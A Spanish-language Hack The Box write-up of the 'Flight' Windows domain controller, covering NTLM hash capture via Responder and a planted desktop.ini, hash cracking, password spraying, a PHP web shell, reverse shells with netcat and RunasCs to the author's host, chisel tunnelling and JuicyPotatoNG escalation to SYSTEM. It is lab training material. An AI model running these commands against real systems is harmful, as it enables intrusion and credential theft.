---
layout: post
title: Flight Hackthebox
---

# Writeup
![Flight]({{'/assets/img/Flight/Flight.png' | relative_url}})

HACK-THE-BOX

------------------------------------------------------------------------------

Iniciamos el escaneo de puertos con ***NMAP*** en la maquina victima.

```bash
❯ nmap -p- --open -sS -T5 -vvv -n -Pn 10.10.11.187
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
```
Posteriormente analizamos lo puertos encontrados, para ver los servicios que corren en cada uno de ellos.

```bash
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49690,49702 10.10.11.187
SPORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-22 01:36:40Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc         Microsoft Windows RPC
49690/tcp open     msrpc         Microsoft Windows RPC
49702/tcp filtered unknown
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m25s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-22T01:37:31
|_  start_date: N/A
```
Visitamos la pagina Web para analizarla.

![imangen web]({{'/assets/img/Flight/flight_htb.png' | relative_url}})

Observamos un nombre de dominio que tendremos que añadir en **/etc/hosts**

Busmos subdomios para ***flight.htb***

```bash
❯ wfuzz -c --hl=154 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb"
 /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                             
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"
```
Compruevo y tengo trazabilidad con mi maquina enviando una petecion a nuestra maquina y escuchando con ***tcpdump***.

![test]({{'/assets/img/Flight/test.png' | relative_url}})

```bash
❯ tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:33:22.071930 IP 10.10.14.23.48408 > flight.htb.https: Flags [S], seq 3775388602, win 64240, options [mss 1460,sackOK,TS val 809004263 ecr 0,nop,wscale 7], length 0
23:33:22.322451 IP 10.10.14.23.48424 > flight.htb.https: Flags [S], seq 2404229495, win 64240, options [mss 1460,sackOK,TS val 809004514 ecr 0,nop,wscale 7], length 0
23:33:23.075627 IP 10.10.14.23.48408 > flight.htb.https: Flags [S], seq 3775388602, win 64240, options [mss 1460,sackOK,TS val 809005267 ecr 0,nop,wscale 7], length 0
```

Parece que tenemos trazabalidad, hare la misma peticion e interceptare con ***Responder*** para 
ver si puedo obterner algun hash de usuario.

```bash
❯ Responder.py -I tun0 -wPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.23]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-GGYTY0EC0YM]
    Responder Domain Name      [HSC6.LOCAL]
    Responder DCE-RPC Port     [45947]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:89218eab23d6213b:E24952A6A2146D6E631D8A9EEA7D6887:010100000000000080F907943246D9018686C96A10472F8E0000000002000800480053004300360001001E00570049004E002D0047004700590054005900300045004300300059004D0004003400570049004E002D0047004700590054005900300045004300300059004D002E0048005300430036002E004C004F00430041004C000300140048005300430036002E004C004F00430041004C000500140048005300430036002E004C004F00430041004C000700080080F907943246D901060004000200000008003000300000000000000000000000003000007C539F3796A2A9DDC3C37BE1694B494B5C96DF954D1E24BBB148B40A3EB0EFA00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
```

Eficvamente obenemos usuario y su hash, para averiguar la clave con fuerza bruta.

```bash
❯ hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

SVC_APACHE::flight:89218eab23d6213b:e24952a6a2146d6e631d8a9eea7d6887:010100000000000080f907943246d9018686c96a10472f8e0000000002000800480053004300360001001e00570049004e002d0047004700590054005900300045004300300059004d0004003400570049004e002d0047004700590054005900300045004300300059004d002e0048005300430036002e004c004f00430041004c000300140048005300430036002e004c004f00430041004c000500140048005300430036002e004c004f00430041004c000700080080f907943246d901060004000200000008003000300000000000000000000000003000007c539f3796a2a9ddc3c37be1694b494b5c96df954d1e24bbb148b40a3eb0efa00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000
:S@*******13
```
Bien, ahora que tenemos claves veremos si son validas para enumerar el servidor ***SMB***.

```bash
❯ smbmap -H flight.htb -u 'svc_apache' -p 'S@*******13'
[+] IP: flight.htb:445	Name: unknown                                           
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY
```

Sin mas, tratare de enumerar usuarios aprovechando las credenciasles.

```bash
❯ cme smb flight.htb -u svc_apache -p 'S@*******13' --users
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated domain user(s)
SMB         flight.htb      445    G0               flight.htb\O.Possum                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 0 baddpwdtime: 2023-02-22 05:53:58.056618+00:00
SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 0 baddpwdtime: 2022-09-22 21:50:15.815981+00:00
SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\S.Moon                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         flight.htb      445    G0               flight.htb\Administrator                  badpwdcount: 0 baddpwdtime: 2022-11-01 02:58:04.270580+00:00

```

Hay buana cantidad de usuarios, tal vez la contraseña que tenemos se reutilize para algun otro.

```bash
❯ cme smb flight.htb -u user.txt -p 'S@*******13' --continue-on-success
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

Bien el usuario ***S.moon*** reutiliza la contraseña. Volvemre a enumerar ***SMB***

```bash
❯ smbmap -H flight.htb -u 's.moon' -p 'S@*******13'
[+] IP: flight.htb:445	Name: unknown                                           
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY
```

Tenemos capacidad de *lectura y escritura* en el direcctorio **share**, tal ve me pueda aprovechar de esto.

Econtre algo interesante buscando por ***Hacktricks***
[desktop.ini -> link](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini)

Creamos nuestro archivo **desktop.ini** y hacemos que busque un recurso que no exista en nuestro equipo.
```php
[.ShellClassInfo]
IconFile=\\ip\test
```
Lo subimos al directorio shared a traves de **smbclient**

```bash
❯ smbclient //flight.htb/shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> put desktop.ini desktop.ini
putting file desktop.ini as \desktop.ini (0,3 kb/s) (average 0,3 kb/s)
```
Y en otra ventana con ***Responder*** obtendremos un nuevo hash.

```bash
❯ Responder.py -I tun0 -wPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.23]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-UETIKVTPO4U]
    Responder Domain Name      [HQCE.LOCAL]
    Responder DCE-RPC Port     [47630]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:93133af5d18b36db:C0CFD8DE096B2DCECDC9C939E87FAC88:0101000000000000806202925346D9010D35B117856D2AB70000000002000800480051004300450001001E00570049004E002D0055004500540049004B005600540050004F003400550004003400570049004E002D0055004500540049004B005600540050004F00340055002E0048005100430045002E004C004F00430041004C000300140048005100430045002E004C004F00430041004C000500140048005100430045002E004C004F00430041004C0007000800806202925346D901060004000200000008003000300000000000000000000000003000007E2491C7D3417D7FA882CEBEAC9C2B03BC8146589A6C757B0B20AC8E2674C9080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
```

Obtenemo un nuevo **hash** con el usuario ***C.bum***, lo pasaremos por *hashcat*

```bash
❯ hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

C.BUM::flight.htb:93133af5d18b36db:c0cfd8de096b2dcecdc9c939e87fac88:0101000000000000806202925346d9010d35b117856d2ab70000000002000800480051004300450001001e00570049004e002d0055004500540049004b005600540050004f003400550004003400570049004e002d0055004500540049004b005600540050004f00340055002e0048005100430045002e004c004f00430041004c000300140048005100430045002e004c004f00430041004c000500140048005100430045002e004c004f00430041004c0007000800806202925346d901060004000200000008003000300000000000000000000000003000007e2491c7d3417d7fa882cebeac9c2b03bc8146589a6c757b0b20ac8e2674c9080a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000
:Ti**************284
```

Tenemos otra contraseña, veamos que podemo hacer con ella.
Volvamo a escanear el servidor ***SMB*** con este usuario.

```bash
❯ smbmap -H flight.htb -u 'c.bum' -p 'Ti**************284'
[+] IP: flight.htb:445	Name: unknown                                           
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ, WRITE
```

Tenemos nuevo direcctorio con capacidad de escritura.

Observamos dos directorios que pertecen a la pagina web ***flight.htb*** donde intetaremos
subir un archivo **web shell** para poder interactuar y obtener una ***reverse-shell***

[Web-shell -> link](https://github.com/flozz/p0wny-shell)
```bash
❯ smbclient //flight.htb/web -U c.bum
Password for [WORKGROUP\c.bum]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 26 00:47:01 2023
  ..                                  D        0  Sun Feb 26 00:47:01 2023
  flight.htb                          D        0  Sun Feb 26 00:47:01 2023
  school.flight.htb                   D        0  Sun Feb 26 00:47:01 2023

		5056511 blocks of size 4096. 1229530 blocks available
smb: \> cd flight.htb
smb: \flight.htb\> put shell.php shell.php
putting file shell.php as \flight.htb\shell.php (82,8 kb/s) (average 82,8 kb/s)
smb: \flight.htb\>
```

Para obertener la **rever-shell** podemo visitar [rev-shell](https://www.revshells.com/)

![web-shell]({{'assets/img/Flight/web-shell.png' | relative_url}})

Nos ponemos en escucha en nuestro equipo con **netcat** en el puerto que queramos.

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.187] 49752
whoami
flight\svc_apache
PS C:\xampp\htdocs\flight.htb>
```

Estamos dentro como **svc_apache** pero tenemos credenciales de **c.bum** asi que cambiaremos de usuario
utilizando **RunasCs** [RunasCs -> link](https://github.com/antonioCoco/RunasCs/tree/master)

Creamos un servidor **http** en nuesto equipo y subimos el archivo RunasCs.cs en la maquina victima y ejecutamos el los comandos necesarios para que sea un ejecutable **.exe**.

```bash
curl 10.10.14.12/RunasCs.cs -o RunasCs.cs
ls


    Directory: C:\users\svc_apache\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/25/2023   4:12 PM          80738 RunasCs.cs                                                            


C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs

Microsoft (R) Visual C# Compiler version 4.7.3190.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

RunasCs.cs(277,29): warning CS0612: 'RunasCs.inet_addr(string)' is obsolete
RunasCs.cs(1306,19): warning CS0649: Field 'AccessToken.TOKEN_PRIVILEGES.PrivilegeCount' is never assigned to, and will always have its default value 0
RunasCs.cs(1308,38): warning CS0649: Field 'AccessToken.TOKEN_PRIVILEGES.Privileges' is never assigned to, and will always have its default value null
RunasCs.cs(1332,23): warning CS0649: Field 'AccessToken.TOKEN_ELEVATION.TokenIsElevated' is never assigned to, and will always have its default value 0
ls


    Directory: C:\users\svc_apache\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/25/2023   4:12 PM          80738 RunasCs.cs                                                            
-a----        2/25/2023   4:13 PM          48640 RunasCs.exe                                                           


PS C:\users\svc_apache\desktop> 
```
A continuacion ejecutamos el siguiente comando, estando en escucha en nuestro equipo por **netcat**

```bash
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.12:443
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5acf5$\Default
[+] Async process 'powershell' with pid 4956 created and left in background.
PS C:\users\svc_apache\desktop>
```
Y obtenemos una nueva conexion como el usruario **c.bum**

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.187] 49818
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
flight\c.bum
PS C:\Windows\system32> 
```
Ya podemos visualizar la **Flag** de bajos privilegios.

```bash
cd \users\c.bum\desktop
ls


    Directory: C:\users\c.bum\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2023   3:43 PM             34 user.txt                                                              


type user.txt
eb7**************************a37
PS C:\users\c.bum\desktop> 
```

```bash
PS C:\users\c.bum\desktop> netstat -a

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             g0:0                   LISTENING
  TCP    0.0.0.0:88             g0:0                   LISTENING
  TCP    0.0.0.0:135            g0:0                   LISTENING
  TCP    0.0.0.0:389            g0:0                   LISTENING
  TCP    0.0.0.0:443            g0:0                   LISTENING
  TCP    0.0.0.0:445            g0:0                   LISTENING
  TCP    0.0.0.0:464            g0:0                   LISTENING
  TCP    0.0.0.0:593            g0:0                   LISTENING
  TCP    0.0.0.0:636            g0:0                   LISTENING
  TCP    0.0.0.0:3268           g0:0                   LISTENING
  TCP    0.0.0.0:3269           g0:0                   LISTENING
  TCP    0.0.0.0:5985           g0:0                   LISTENING
  TCP    0.0.0.0:8000           g0:0                   LISTENING
  TCP    0.0.0.0:9389           g0:0                   LISTENING
  TCP    0.0.0.0:47001          g0:0                   LISTENING
  TCP    0.0.0.0:49664          g0:0                   LISTENING
  TCP    0.0.0.0:49665          g0:0                   LISTENING
  TCP    0.0.0.0:49666          g0:0                   LISTENING
  TCP    0.0.0.0:49667          g0:0                   LISTENING
  TCP    0.0.0.0:49673          g0:0                   LISTENING
  TCP    0.0.0.0:49674          g0:0                   LISTENING
  TCP    0.0.0.0:49682          g0:0                   LISTENING
  TCP    0.0.0.0:49690          g0:0                   LISTENING
  TCP    0.0.0.0:49701          g0:0                   LISTENING
  TCP    10.10.11.187:53        g0:0                   LISTENING
```
Analizo los puertos abierto en la maquina con el usuario **c.bum** y observo el puerto 8000 
utilizare **chisel** para traermelo a mi equipo y hecharle un vistazo.

```bash
PS C:\users\c.bum\desktop> .\chisel.exe client 10.10.14.12:1234 R:8000:127.0.0.1:8000
```
```bash
❯ ./chisel server --reverse -p 1234
2023/02/25 18:31:20 server: Reverse tunnelling enabled
2023/02/25 18:31:20 server: Fingerprint Yot1qXxzAiSFh1j11idn6vEk8JcK5qB07G2/d6LpViM=
2023/02/25 18:31:20 server: Listening on http://0.0.0.0:1234
2023/02/25 18:31:38 server: session#1: Client version (1.8.1) differs from server version (0.0.0-src)
2023/02/25 18:31:38 server: session#1: tun: proxy#R:8000=>8000: Listening
```

Despues de conctarme a la web veo que esta escrito en **ASP .NET** provare a cargar una **shell .aspx** y conectarme.

![img]({{'assets/img/Flight/chisel-web.png' | relative_url}})

```bash
cPS C:\users\c.bum\desktop> url 10.10.14.12/cmd.aspx -o cmd.aspx

ls


    Directory: C:\users\c.bum\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/25/2023   4:25 PM        8676864 chisel.exe                                                            
-a----        2/25/2023   4:42 PM           1400 cmd.aspx                                                              
-ar---        2/25/2023   3:43 PM             34 user.txt                                                              


PS C:\users\c.bum\desktop> copy cmd.aspx C:\inetpub\development
```
Tranferimos el archivo a la maquina victima y lo copiasmos en la ruta indicada 'la maquina lo borra y conviene tenerlo a mano'.

![img]({{'assets/img/Flight/aspx.png' | relative_url}})

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.187] 49947
PS C:\windows\system32\inetsrv> whoami /priv
iis apppool\defaultapppool

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```
Mirando lo privilegios veo que podemos impersonar lo privilegios de usuasios 'aqui mas informacion [SeImpersonatePrivilege](https://learn.microsoft.com/es-es/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege)'

En este caso provaremo con **juicypotato** para obtener los privilegios maximos.
Subimos los archivos ***nc.exe*** y ***JuicyPotatoNG.exe*** a la maquina victima
y le damos permisos de ejecucion para todos los usuarios.


```bash
PS C:\users\c.bum\desktop> ls


    Directory: C:\users\c.bum\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/25/2023   4:25 PM        8676864 chisel.exe                                                            
-a----        2/25/2023   4:42 PM           1400 cmd.aspx                                                              
-a----        2/25/2023   5:35 PM         153600 JuicyPotatoNG.exe                                                     
-a----        2/25/2023   5:35 PM          28160 nc.exe                                                                
-ar---        2/25/2023   3:43 PM             34 user.txt                                                              


icacls JuicyPotatoNG.exe /grant Users:F
icacls JuicyPotatoNG.exe /grant Users:F
processed file: JuicyPotatoNG.exe
Successfully processed 1 files; Failed processing 0 files
icacls nc.exe /grant Users:F
icacls nc.exe /grant Users:F
processed file: nc.exe
Successfully processed 1 files; Failed processing 0 files
PS C:\users\c.bum\desktop> 
```

Ejecutamos el siguiente comando en la sesion que tenemos con ***iis apppool\defaultapppool*** 

```bash
PS C:\windows\system32\inetsrv> c:\users\c.bum\desktop\prueba.exe -t * -p "c:\users\c.bum\desktop\nc.exe" -a "10.10.14.12 443 -e cmd.exe"
```
Hemos ganado acceso como **nt authority\system** y ya podemos visualizar la *flag* de maximos privilegios.


```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.187] 50235
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

type \users\administrator\desktop\root.txt
type \users\administrator\desktop\root.txt
894**************************347

C:\>
```
Maquina concluida.
# Espero que te pueda servir de ayuda. *GRACIAS por venir*
